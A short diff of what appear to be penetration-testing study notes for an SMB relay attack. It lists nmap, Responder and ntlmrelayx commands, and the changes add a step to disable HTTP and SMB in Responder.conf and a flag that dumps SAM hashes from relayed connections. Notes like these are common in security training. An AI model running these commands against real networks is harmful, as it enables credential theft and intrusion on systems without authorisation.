@@ -27,11 +27,11 @@
         a. Nmap --script=smb2-security-mode.nse -p445 <ip>
     2. Run Responder
         a. Edit responder.conf
-            i. Sudo mousepad /etc/responder/Responder.conf
+            i. Sudo mousepad /etc/responder/Responder.conf and turn off http and smb
         b. Run responder
             i. Sudo responder -I eth0 -dwP
     3. Set up relay using Ntlmrelayx.py ( install using pimp my linux)
-        a. Ntlmrelays.py -tf targets.txt -smb2support
+        a. Ntlmrelays.py -tf targets.txt -smb2support --dump-hashes dumps hashes
     4. Make a connection request to attacker machine same as LLMNR
         a. Capture SAM hashes on the responder 
 
